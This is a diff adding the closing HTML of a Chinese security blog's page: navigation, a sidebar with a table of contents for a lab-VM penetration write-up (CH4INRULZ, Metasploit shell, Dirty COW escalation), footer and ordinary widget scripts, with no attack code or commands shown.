+            
+              <a href="/2020/04/21/组合拳高效社工定位骗子/" rel="next" title="组合拳高效社工定位骗子">
+                <i class="fa fa-chevron-left"></i> 组合拳高效社工定位骗子
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/26/靶机渗透记录—Lampiao/" rel="prev" title="靶机渗透记录—Lampiao">
+                靶机渗透记录—Lampiao <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机渗透记录—CH4INRULZ-v1-0-1"><span class="nav-number">1.</span> <span class="nav-text">靶机渗透记录—CH4INRULZ_v1.0.1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#打开靶机"><span class="nav-number">1.1.</span> <span class="nav-text">打开靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集"><span class="nav-number">1.2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看主站"><span class="nav-number">1.3.</span> <span class="nav-text">查看主站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查看旁站"><span class="nav-number">1.4.</span> <span class="nav-text">查看旁站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Msf-Getshell"><span class="nav-number">1.5.</span> <span class="nav-text">Msf Getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脏牛提权"><span class="nav-number">1.6.</span> <span class="nav-text">脏牛提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#缺少依赖报错"><span class="nav-number">1.6.1.</span> <span class="nav-text">缺少依赖报错</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.7.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2020/05/26/靶机渗透记录—CH4INRULZ-v1-0-1/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
